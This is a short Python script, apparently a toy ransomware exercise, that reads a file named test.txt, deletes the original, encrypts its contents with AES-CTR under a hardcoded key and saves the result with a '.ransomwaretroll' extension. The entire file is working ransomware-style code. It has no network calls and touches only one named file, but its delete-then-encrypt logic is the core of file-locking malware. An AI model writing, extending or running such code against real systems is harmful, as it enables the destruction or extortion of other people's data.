import os
import pyaes

## Open the file to encrypt

file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Remove the original file

os.remove(file_name)

## Define encryptation key

key = b"testinransomware"
aes = pyaes.AESModeOfOperationCTR(key)

## Encrypt the file

crypto_data = aes.encrypt(file_data)

## Save the encrypted file

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
